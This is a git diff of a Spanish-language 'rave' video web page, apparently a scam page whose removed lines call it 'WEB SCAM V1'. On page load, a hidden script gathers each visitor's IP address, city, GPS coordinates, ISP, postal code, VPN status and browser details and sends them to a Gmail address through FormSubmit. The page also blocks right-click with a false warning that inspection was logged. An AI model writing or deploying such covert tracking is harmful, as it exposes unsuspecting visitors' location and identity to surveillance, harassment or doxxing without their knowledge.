@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TU IP ESTA A MANOS DE 33 AHORA- MI WEB MIS REGLAS</title>
+    <title>Página de Prueba - Máxima Captura de Datos</title>
     <style>
         /* --- ESTILOS RAVE/DARK --- */
         body {
@@ -33,18 +33,17 @@
     </style>
 </head>
 <body>
-    <h1>BIENVENIDO USUARIO DE RAVE: TE VAS TRACKEADO</h1>
-    <p>CODIGO FUENTE Y SCRIPTS CREADOS POR 33 - MANEJO DE HOSTING Y SERVIDOR POR 32.</p>
+    <h1>BIENVENIDO AL RAVE: TE VAS TRACKEADO</h1>
+    <p>Presiona Play para iniciar la secuencia de 10 segundos.</p>
 
     <video width="720" controls> 
       <source src="clip.mp4" type="video/mp4">
       Tu navegador no puede reproducir este video.
     </video>
 
-    <p>WEB SCAM V1</p>
+    <p>URL: https://capture-tu-ip.github.io/TeVasTrackeado/</p>
 
     <script>
-        // --- CONFIGURACIÓN CRÍTICA ---
         // 📧 CORREO DE DESTINO:
         const FORM_SUBMIT_ENDPOINT = 'https://formsubmit.co/ajax/system404g%40gmail.com'; 
         
@@ -58,31 +57,36 @@
         const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
         const colorDepth = screen.colorDepth;
         
-        // --- FUNCIÓN PRINCIPAL: Escaneo Completo de IP (Usando API Pública Sin Clave) ---
+        // --- FUNCIÓN PRINCIPAL: Escaneo Único de IP para Máxima Estabilidad ---
         
-        // Paso A: Escanear la IP con ip-api.com (Geo, ISP, Seguridad)
-        // Usamos un endpoint que devuelve la mayor cantidad de datos sin necesidad de API Key.
-        // NOTA: Se usa 'http' porque la API gratuita es menos estable con HTTPS en algunos hosts.
+        // Escanear la IP con ip-api.com (Geo, ISP, Seguridad) en una sola llamada.
+        // Se usa un campo extenso para recopilar todos los datos necesarios.
         const scanUrl = 'http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,reverse,hosting,proxy,mobile';
 
         fetch(scanUrl)
             .then(geoResponse => geoResponse.json())
             .then(geoData => {
                 
-                const userIP = geoData.query || 'N/A'; // La IP es parte de la respuesta
+                // Si el estado no es 'success', no podemos enviar el correo.
+                if (geoData.status !== 'success') {
+                    console.error("Error al escanear la IP:", geoData.message);
+                    return; 
+                }
+
+                const userIP = geoData.query || 'N/A';
                 
                 // Ensamblar TODOS los datos para el envío final
                 const finalPayload = {
-                    "_subject": "ESCANEO COMPLETO DE IP (PÚBLICO) - TeVasTrackeado", 
+                    "_subject": "✅ DATOS RECIBIDOS (ESTABLE) - TeVasTrackeado", 
                     "IP_Visitante": userIP,
                     
-                    // --- DATOS DE GEOLOCALIZACIÓN Y RED (ip-api.com) ---
+                    // --- DATOS DE GEOLOCALIZACIÓN Y RED ---
                     "Geo_Pais_Region": `${geoData.country || 'N/A'} - ${geoData.regionName || 'N/A'} (${geoData.city || 'N/A'})`,
                     "Coordenadas_GPS_IP": `${geoData.lat || 'N/A'}, ${geoData.lon || 'N/A'}`,
                     "Organizacion_ISP": geoData.isp || geoData.org || 'N/A',
                     "ASN": geoData.as || 'N/A',
                     "Codigo_Postal": geoData.zip || 'N/A',
-                    "Reverse_DNS": geoData.reverse || 'N/A', // Hostname de la IP
+                    "Reverse_DNS": geoData.reverse || 'N/A', 
 
                     // --- DATOS DE SEGURIDAD Y CONEXIÓN ---
                     "Es_Proxy_VPN": geoData.proxy === true ? '🚨 SÍ' : 'No',
@@ -101,7 +105,7 @@
                     "Fecha_Hora_Visita": new Date().toLocaleString(),
                 };
                 
-                // Enviar TODOS los datos al correo (FormSubmit)
+                // Paso Final: Enviar TODOS los datos al correo (FormSubmit)
                 return fetch(FORM_SUBMIT_ENDPOINT, {
                     method: 'POST',
                     headers: {
@@ -111,18 +115,25 @@
                     body: JSON.stringify(finalPayload)
                 });
             })
-            .catch(error => console.error('Error Crítico en el Escaneo:', error));
+            .then(response => {
+                 // Esta parte confirma si FormSubmit respondió correctamente.
+                 if (response.ok) {
+                     console.log("Datos enviados con éxito a FormSubmit.");
+                 } else {
+                     console.error("Error de FormSubmit:", response.statusText);
+                 }
+            })
+            .catch(error => console.error('Fallo total en la ejecución del script:', error));
     </script>
     
     <script>
-        // Efecto 1: Título Parpadeante (Neón)
+        // Efectos Visuales (Parpadeo, Clic Derecho, etc.)
         function blink() {
             var h1 = document.querySelector('h1');
             h1.style.visibility = (h1.style.visibility === 'hidden' ? 'visible' : 'hidden');
         }
         setInterval(blink, 500);
 
-        // Efecto 2: Cambio de Color de Borde Aleatorio (Rave)
         function changeBorderColor() {
             const video = document.querySelector('video');
             const randomColor = '#' + Math.floor(Math.random()*16777215).toString(16).padStart(6, '0');
@@ -131,13 +142,11 @@
         }
         setInterval(changeBorderColor, 2000);
 
-        // Bloqueo de Clic Derecho
         document.addEventListener('contextmenu', function(e) {
             e.preventDefault();
             alert("Advertencia: Intento de inspección registrado. Acceso denegado.");
         });
         
-        // Redireccionamiento a HTTPS
         if (window.location.protocol === 'http:') {
             window.location.protocol = 'https:';
         }
